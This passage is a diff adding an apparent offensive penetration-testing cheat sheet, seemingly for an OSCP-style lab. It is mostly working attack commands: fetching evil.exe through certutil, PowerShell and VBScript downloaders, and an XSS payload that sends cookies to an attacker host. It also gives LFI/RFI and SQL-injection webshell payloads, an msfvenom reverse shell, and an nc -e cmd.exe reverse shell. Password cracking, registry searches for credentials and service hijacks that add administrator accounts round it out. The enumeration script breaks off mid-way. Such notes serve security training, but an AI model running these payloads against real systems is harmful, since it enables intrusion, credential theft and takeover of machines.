+</span><span style="color:#b48ead;">ftp</span><span> -v -n -s:</span><span style="color:#b48ead;">ftp</span><span>.txt
+</span></code></pre>
+<pre data-lang="bat" style="background-color:#2b303b;color:#c0c5ce;" class="language-bat "><code class="language-bat" data-lang="bat"><span style="color:#b48ead;">echo</span><span> open </span><span style="color:#d08770;">10</span><span>.</span><span style="color:#d08770;">11</span><span>.</span><span style="color:#d08770;">0</span><span>.</span><span style="color:#d08770;">219 21</span><span>&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span style="color:#b48ead;">echo</span><span> USER anonymous&gt;&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span style="color:#b48ead;">echo</span><span> ftp&gt;&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span style="color:#b48ead;">echo</span><span> bin &gt;&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span style="color:#b48ead;">echo</span><span> GET wce32.exe &gt;&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span style="color:#b48ead;">echo</span><span> bye &gt;&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span>
+</span><span style="color:#b48ead;">ftp</span><span> -v -n -s:</span><span style="color:#b48ead;">ftp</span><span>.txt
+</span></code></pre>
+<p>VBScript that acts like wget:</p>
+<pre data-lang="vb" style="background-color:#2b303b;color:#c0c5ce;" class="language-vb "><code class="language-vb" data-lang="vb"><span>echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs
+</span><span>echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs
+</span><span>echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs
+</span><span>echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs
+</span><span>echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs
+</span><span>echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs
+</span><span>echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs
+</span><span>echo Err.Clear &gt;&gt; wget.vbs
+</span><span>echo Set http = Nothing &gt;&gt; wget.vbs
+</span><span>echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs
+</span><span>echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs
+</span><span>echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs
+</span><span>echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs
+</span><span>echo http.Open &quot;GET&quot;, strURL, False &gt;&gt; wget.vbs
+</span><span>echo http.Send &gt;&gt; wget.vbs
+</span><span>echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs
+</span><span>echo Set http = Nothing &gt;&gt; wget.vbs
+</span><span>echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs
+</span><span>echo Set ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs
+</span><span>echo strData = &quot;&quot; &gt;&gt; wget.vbs
+</span><span>echo strBuffer = &quot;&quot; &gt;&gt; wget.vbs
+</span><span>echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs
+</span><span>echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs
+</span><span>echo Next &gt;&gt; wget.vbs
+</span><span>echo ts.Close &gt;&gt; wget.vbs
+</span></code></pre>
+<p>Then to execute the script wget.vbs script:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>cscript wget.vbs http://10.11.0.219/evil.exe evil.exe
+</span></code></pre>
+<p>Powershell script that acts like wget:</p>
+<pre data-lang="powershell" style="background-color:#2b303b;color:#c0c5ce;" class="language-powershell "><code class="language-powershell" data-lang="powershell"><span>echo $</span><span style="color:#bf616a;">storageDir </span><span>= $pwd &gt; wget.ps1
+</span><span>echo $</span><span style="color:#bf616a;">webclient </span><span>= </span><span style="color:#96b5b4;">New-Object</span><span> System.Net.WebClient &gt;&gt;wget.ps1
+</span><span>echo $</span><span style="color:#bf616a;">url </span><span>= &quot;</span><span style="color:#a3be8c;">http://10.11.0.219/evil.exe</span><span>&quot; &gt;&gt;wget.ps1
+</span><span>echo $</span><span style="color:#bf616a;">file </span><span>= &quot;</span><span style="color:#a3be8c;">new-exploit.exe</span><span>&quot; &gt;&gt;wget.ps1
+</span><span>echo $</span><span style="color:#bf616a;">webclient.DownloadFile</span><span>($</span><span style="color:#bf616a;">url</span><span>,$</span><span style="color:#bf616a;">file</span><span>) &gt;&gt;wget.ps1
+</span></code></pre>
+<p>To execute the wget.ps1 file:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+</span></code></pre>
+<p>File transfer using <code>certutil.exe</code>:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>certutil.exe -urlcache -split -f &quot;http://10.11.0.219/fgdump.exe&quot; fgdump.exe
+</span></code></pre>
+<p><code>Debug.exe</code> is an assembler, disassembler, and hex dumping tool:</p>
+<ol>
+<li><pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>locate nc.exe|grep binaries
+</span></code></pre>
+</li>
+<li><pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>cp /usr/share/windows-binaries/nc.exe .
+</span></code></pre>
+</li>
+<li><pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>ls -l nc.exe
+</span></code></pre>
+</li>
+<li><pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>upx -9 nc.exe - upx compacts the file size
+</span></code></pre>
+</li>
+<li><pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>locate exe2bat
+</span></code></pre>
+</li>
+<li><pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>cp /usr/share/windows-binaries/exe2bat.exe .
+</span></code></pre>
+</li>
+<li><pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>wine exe2bat.exe nc.exe nc.txt
+</span></code></pre>
+<p>Convert .exe to .txt file for victim's debug.exe to be unpacked.</p>
+</li>
+</ol>
+<hr />
+<h2 id="web-application-attacks">Web Application Attacks</h2>
+<p>Test to see if site is vulnerable to XSS:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
+</span></code></pre>
+<p>Stealing cookies and session information:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>&lt;script&gt;new Image().src=&quot;http://10.11.0.219/bogus.php?output=&quot;+document.cookie;&lt;/script&gt;
+</span></code></pre>
+<p>Once the script tag is in place, run ''nc'' to capture the cookie when the user loads the page:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>nc -nvlp 80
+</span></code></pre>
+<p>Bypass file upload filtering and restrictions:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>php - phtml, .php, .php3, .php4, .php5, and .inc
+</span><span>asp - asp, .aspx
+</span><span>perl - .pl, .pm, .cgi, .lib
+</span><span>jsp - .jsp, .jspx, .jsw, .jsv, and .jspf
+</span><span>Coldfusion - .cfm, .cfml, .cfc, .dbm
+</span></code></pre>
+<hr />
+<h2 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h2>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md</a></p>
+<p>In the following examples we include the /etc/passwd file.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://example.com/index.php?page=../../../etc/passwd
+</span></code></pre>
+<h4 id="null-byte">Null Byte</h4>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://example.com/index.php?page=../../../etc/passwd%00
+</span></code></pre>
+<h4 id="double-encoding">Double encoding</h4>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
+</span><span>http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
+</span></code></pre>
+<h4 id="path-and-dot-truncation">Path and dot truncation</h4>
+<p>On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
+</span><span>http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
+</span><span>http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE]
+</span><span>http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
+</span></code></pre>
+<h5 id="filter-bypass-tricks">Filter bypass tricks</h5>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://example.com/index.php?page=....//....//etc/passwd
+</span><span>http://example.com/index.php?page=..///////..////..//////etc/passwd
+</span><span>http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc
+</span></code></pre>
+<hr />
+<h2 id="remote-file-inclusion-rfi">Remote File Inclusion (RFI)</h2>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md</a></p>
+<p>Most of the filter bypasses from LFI section can be reused for RFI.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://example.com/index.php?page=http://evil.com/shell.txt
+</span></code></pre>
+<h3 id="null-byte-1">Null byte</h3>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://example.com/index.php?page=http://evil.com/shell.txt%00
+</span></code></pre>
+<h3 id="double-encoding-1">Double encoding</h3>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
+</span></code></pre>
+<h3 id="bypass-allow-url-include">Bypass allow_url_include</h3>
+<p>When allow_url_include and <code>allow_url_fopen</code> are set to <code>Off</code>. It is still possible to include a remote file on Windows box using the smb protocol.</p>
+<ul>
+<li>Create a share open to everyone</li>
+<li>Write a PHP code inside a file : shell.php</li>
+<li>Include it <code>%%http://example.com/index.php?page=\\10.0.0.1\share\shell.php%%</code></li>
+</ul>
+<hr />
+<h2 id="lfi-rfi-using-wrappers">LFI / RFI using wrappers</h2>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md</a></p>
+<h3 id="wrapper-php-filter">Wrapper php://filter</h3>
+<p>The part %%php://filter%% is case insensitive</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+</span><span>http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+</span><span>http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
+</span></code></pre>
+<p>can be chained with a compression wrapper for large files.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+</span></code></pre>
+<p>NOTE: Wrappers can be chained:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s&#39;&#39;
+</span></code></pre>
+<h3 id="wrapper-zip">Wrapper zip://</h3>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>echo &quot;&lt;pre&gt;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&lt;/pre&gt;&quot; &gt; payload.php;  
+</span><span>zip payload.zip payload.php;
+</span><span>mv payload.zip shell.jpg;
+</span><span>rm payload.php
+</span><span>
+</span><span>http://example.com/index.php?page=zip://shell.jpg%23payload.php
+</span></code></pre>
+<h3 id="wrapper-data">Wrapper data://</h3>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+</span><span>
+</span><span>NOTE: the payload is &quot;&lt;?php system($_GET[&#39;cmd&#39;]);echo &#39;Shell done !&#39;; ?&gt;&quot;
+</span></code></pre>
+<p>Fun fact: you can trigger an XSS and bypass the Chrome Auditor with: <code>http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+</code></p>
+<h3 id="wrapper-expect">Wrapper expect://</h3>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://example.com/index.php?page=expect://id
+</span><span>http://example.com/index.php?page=expect://ls
+</span></code></pre>
+<h3 id="wrapper-input">Wrapper input://</h3>
+<p>Specify your payload in the POST parameters</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://example.com/index.php?page=php://input
+</span><span>POST DATA: &lt;?php system(&#39;id&#39;); ?&gt;
+</span></code></pre>
+<h3 id="wrapper-phar">Wrapper phar://</h3>
+<p>Create a phar file with a serialized object in its meta-data.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>// create new Phar
+</span><span>$phar = new Phar(&#39;test.phar&#39;);
+</span><span>$phar-&gt;startBuffering();
+</span><span>$phar-&gt;addFromString(&#39;test.txt&#39;, &#39;text&#39;);
+</span><span>$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;);
+</span><span>
+</span><span>// add object of any class as meta data
+</span><span>class AnyClass {}
+</span><span>$object = new AnyClass;
+</span><span>$object-&gt;data = &#39;rips&#39;;
+</span><span>$phar-&gt;setMetadata($object);
+</span><span>$phar-&gt;stopBuffering();
+</span></code></pre>
+<p>If a file operation is now performed on our existing Phar file via the %%phar://%% wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>class AnyClass {
+</span><span>    function __destruct() {
+</span><span>        echo $this-&gt;data;
+</span><span>    }
+</span><span>}
+</span><span>// output: rips
+</span><span>include(&#39;phar://test.phar&#39;);
+</span></code></pre>
+<p>NOTE: The unserialize is triggered for the <code>%%phar://%%</code> wrapper in any file operation, file_exists and many more.</p>
+<h2 id="sql-injection">SQL Injection</h2>
+<p><a href="https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/">https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/</a></p>
+<p>POST request SQL injection:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>q=injection&amp;lang=en &#39;union all select 1,2,3,4,&quot;&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot;,6 into OUTFILE &#39;c:/xampp/htdocs/bd.php%00&#39;&#39;
+</span></code></pre>
+<hr />
+<h2 id="mssql-commands">MSSQL Commands</h2>
+<p><a href="https://www.hackingloops.com/how-to-hack-windows-servers-using-privilege-escalation/">https://www.hackingloops.com/how-to-hack-windows-servers-using-privilege-escalation/</a></p>
+<p>Connect MSSQL server:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>sqsh -S 10.11.1.227:27900 -U sa -P password
+</span></code></pre>
+<p>Check currently logged in user:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>exec xp_cmdshell &#39;whoami&#39;
+</span><span>go
+</span></code></pre>
+<p>If you have SYSTEM privileges, proceed with uploading reverse shell payload and execute.</p>
+<hr />
+<h2 id="tomcat-manager">Tomcat Manager</h2>
+<p>Create reverse shell payload using WAR format:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.219 LPORT=4444 -f war -o reverse.war
+</span></code></pre>
+<hr />
+<h2 id="brute-force-and-cracking">Brute Force and Cracking</h2>
+<p>Hydra supported services:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post} http[s]-{get|post}-form http-proxy
+</span><span>http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres
+</span><span>radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
+</span></code></pre>
+<p>Hydra HTTP-POST-FORM request:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>hydra -l root@localhost -P /usr/share/wordlists/word.txt 10.11.1.39 http-post-form &quot;/otrs/index.pl:Action=Login&amp;RequestedURL=&amp;Lang=en&amp;TimeOffset=300&amp;User=^USER^&amp;Password=^PASS^:Login Failed&quot; -V
+</span></code></pre>
+<p>Find Hash type:</p>
+<p><a href="https://hashkiller.co.uk">https://hashkiller.co.uk</a></p>
+<p>Cracking passwords using CPU:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
+</span></code></pre>
+<p>Cracking passwords using GPU:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>hashcat -m 500 -a 0 -o output.txt -remove hashes.txt /usr/share/wordlists/rockyou.txt
+</span></code></pre>
+<p>Cracking /etc/shadow:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>unshadow /etc/passwd /etc/shadow /tmp/combined; john --wordlist=&lt;any word list&gt; /tmp/combined
+</span></code></pre>
+<p>Online rainbow tables:</p>
+<p><a href="https://crackstation.net/">https://crackstation.net/</a></p>
+<p><a href="http://www.cmd5.org/">http://www.cmd5.org/</a></p>
+<p><a href="http://crackhash.com/">http://crackhash.com/</a></p>
+<p><a href="https://hashkiller.co.uk/md5-decrypter.aspx">https://hashkiller.co.uk/md5-decrypter.aspx</a></p>
+<p><a href="https://www.onlinehashcrack.com/">https://www.onlinehashcrack.com/</a></p>
+<p><a href="http://rainbowtables.it64.com/">http://rainbowtables.it64.com/</a></p>
+<p><a href="http://www.md5online.org/">http://www.md5online.org/</a></p>
+<hr />
+<h2 id="tips-and-tricks-for-windows-privilege-escalation">Tips and Tricks for Windows Privilege Escalation</h2>
+<p>Windows privesc scripts and binaries:</p>
+<p><a href="https://github.com/jivoi/pentest/tree/master/exploit_win">https://github.com/jivoi/pentest/tree/master/exploit_win</a></p>
+<p><a href="https://github.com/abatchy17/WindowsExploits">https://github.com/abatchy17/WindowsExploits</a></p>
+<p><a href="https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html">https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html</a> - Great list for Windows XP</p>
+<p><a href="https://github.com/3ndG4me/AutoBlue-MS17-010">https://github.com/3ndG4me/AutoBlue-MS17-010</a> - Great exploit for windows 2000 to Windows 10</p>
+<p><a href="https://medium.com/@sdgeek/hack-the-box-htb-blue-115b3f563125">https://medium.com/@sdgeek/hack-the-box-htb-blue-115b3f563125</a> - MS17-010 Exploit tutorial</p>
+<h2 id="windows-privilege-escalation">Windows Privilege Escalation</h2>
+<p><a href="https://www.youtube.com/playlist?list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP">https://www.youtube.com/playlist?list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP</a></p>
+<p>Gathering information of the system:</p>
+<p><a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a></p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>systeminfo | findstr /B /C:”OS Name” /C:”OS Version”
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>ver
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>hostname
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>whoami
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>echo %username%
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; hostname echo %username% net users ipconfig /all route print arp -A netstat -ano netsh firewall show state netsh firewall show config shtasks /query /fo LIST /v tasklist /SVC net start
+</span></code></pre>
+<p>Check list of installed Windows patches:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>wmic qfe get Caption,Description,HotFixID,InstalledOn
+</span></code></pre>
+<p>Windows exploit suggester:</p>
+<p><a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p>
+<p>Potential files containing passwords:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>c:\sysprep.inf
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>c:\sysprep\sysprep.xml
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>%WINDIR%\Panther\Unattend\Unattended.xml
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>%WINDIR%\Panther\Unattended.xml
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>c:\unattend.txt
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>c:\sysprep.ini - [Clear Text]
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>c:\sysprep\sysprep.xml - [Base64]
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>findstr /si password *.txt | *.xml | *.ini
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>reg query HKLM /s | findstr /i password &gt; temp.txt
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>reg query HKCU /s | findstr /i password &gt; temp.txt
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>reg query HKLM /f password /t REG_SZ /s
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>reg query HKCU /f password /t REG_SZ /s
+</span></code></pre>
+<p>Windows Python Installer to run a single .py script as an .exe file:</p>
+<ol>
+<li>Install python on Windows machine.</li>
+<li>Extract pyinstaller.zip</li>
+<li><code>python pyinstaller.py --onefile ms11-080.py</code></li>
+</ol>
+<p>Check insecure permissions, create malicious code and replace the .exe with insecure permissions:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>icacls scsiaccess.exe
+</span></code></pre>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span>&gt;
+</span><span>
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main </span><span>()
+</span><span>{
+</span><span>  </span><span style="color:#b48ead;">int</span><span> i;
+</span><span>  i=</span><span style="color:#96b5b4;">system </span><span>(&quot;</span><span style="color:#a3be8c;">net localgroup administrators low /add</span><span>&quot;);
+</span><span>  </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span>;
+</span><span>}
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
+</span></code></pre>
+<p>Cross compile exploits:</p>
+<ol>
+<li><code>cp /usr/share/exploitdb/platforms/windows/local/&lt;exploit&gt;.c /tmp/</code></li>
+<li><code>cd /root/.wine/drive_c/MinGW/bin</code></li>
+<li><code>wine gcc –o w00t.exe /tmp/&lt;exploit&gt;.c -l lib</code></li>
+</ol>
+<p>Runas Account command:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>runas /user:offsec-labs\low cmd.exe
+</span></code></pre>
+<p>Add user to local group:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>accesschk.exe -uwqs users c:\*.*
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>accesschk.exe -uwqs “Authenticated Users” c:\*.*
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>cacls &quot;c:\Program Files&quot; /T | findstr Users
+</span></code></pre>
+<p>Find weak service permissions:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>accesschk.exe -uwcqv *
+</span></code></pre>
+<p>Accesschk.exe for Windows XP:</p>
+<p><a href="https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe">https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe</a></p>
+<p>Accesschk.exe commands to find read/write services:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>accesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteula - This command worked for XP
+</span><span>accesschk.exe -qdws &quot;Authenticated Users&quot; C:\Windows\ /accepteula
+</span><span>accesschk.exe -qdws Users C:\Windows\
+</span></code></pre>
+<p>If you found a vulnerable RW service from using accesschk:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>sc config upnphost binpath= &quot;net user rootuser r00ted123 /add&quot;
+</span><span>sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;
+</span><span>sc config upnphost depend= &quot;&quot;
+</span></code></pre>
+<p>Then proceed with restarting the service to execute the binpath command and add new user to administrators group:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>sc start upnphost
+</span><span>sc config upnphost binpath= &quot;net localgroup administrators rootuser /add&quot;
+</span><span>sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;
+</span><span>sc config upnphost depend= &quot;&quot;
+</span><span>sc start upnphost
+</span></code></pre>
+<p>Check for stored credentials:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>cmdkey /list
+</span></code></pre>
+<p>If there are entries, it means that we may able to <code>runas</code> certain user who stored his credentials in windows:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>runas /savecred /user:ACCESS\Administrator &quot;c:\windows\system32\cmd.exe /c \IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe&quot;
+</span></code></pre>
+<p>Windows Exploits by Patch:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>MS10-015
+</span><span>MS10-059
+</span><span>MS10-092
+</span><span>MS11-080
+</span><span>MS13-005
+</span><span>CVE-2013-3660
+</span><span>MS13-053
+</span><span>MS13-081
+</span><span>MS14-058
+</span><span>MS14-068
+</span><span>MS14-070
+</span><span>MS15-001
+</span><span>MS15-051
+</span><span>MS15-052
+</span><span>MS17-010 - [https://github.com/worawit/MS17-010/](https://github.com/worawit/MS17-010/)
+</span></code></pre>
+<p>Windows Enumeration Script:</p>
+<pre data-lang="batch" style="background-color:#2b303b;color:#c0c5ce;" class="language-batch "><code class="language-batch" data-lang="batch"><span>@echo OFF
+</span><span>call:credits
+</span><span>call:CheckOSbitrate
+</span><span>call:CheckOSversion
+</span><span>call:checkprerequisitefiles
+</span><span>
+</span><span>call:checkquickwins
+</span><span>call:getfirewallinformation
+</span><span>call:getcomputerinformation
+</span><span>call:dumphashespasseskerberoscerts
+</span><span>call:findinterestingfiles
+</span><span>call:findinterestingregistrykeys
+</span><span>call:findpasswords
+</span><span>call:checkweakpermissions
+</span><span>call:cleanup
+</span><span>goto end
+</span><span>
+</span><span>:credits
+</span><span>echo.----------------------------------------------------
+</span><span>echo.Author: Jollyfrogs, Brisbane QLD
+</span><span>echo.A root loot script I used to learn batch techniquesP, needs TLC
+</span><span>echo.----------------------------------------------------
+</span><span>echo.
+</span><span>goto:eof
+</span><span>
+</span><span>:CheckOSbitrate
+</span><span>IF DEFINED ProgramFiles(x86) (set OSbit=64) else (set OSbit=32)
+</span><span>goto:eof
+</span><span>
+</span><span>:checkprerequisitefiles
+</span><span>REM SOME OF THESE COMMANDS MIGHT GENERATE ERRORS SO WE CATCH THEM ALL HERE
+</span><span>echo ====================================================================
+</span><span>echo ====================== IGNORE THESE ERRORS =========================
+</span><span>dir jollykatz%OSbit%.exe /a/s/b 1&gt; nul 2&gt; NUL
+</span><span>IF %ERRORLEVEL% == 0 set jollykatz=1
+</span><span>for /f &quot;tokens=1 delims=&quot; %%a in (&#39;whoami&#39;) do set whoami=%%a
+</span><span>for /f &quot;tokens=1 delims=&quot; %%a in (&#39;netsh /? ^| findstr \.*.irewal.*.*&#39;) do set netshfirewall=%%a
+</span><span>
+</span><span>REM
+</span><span>REM check registry for the following registry entries:
+</span><span>REM
+</span><span>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated | Find &quot;0x1&quot; 1&gt; NUL
+</span><span>IF %ERRORLEVEL% == 0 (
+</span><span>	reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated | Find &quot;0x1&quot; 1&gt; NUL
+</span><span>	IF %ERRORLEVEL% == 0 (set alwaysinstallelevated=1)
+</span><span>)
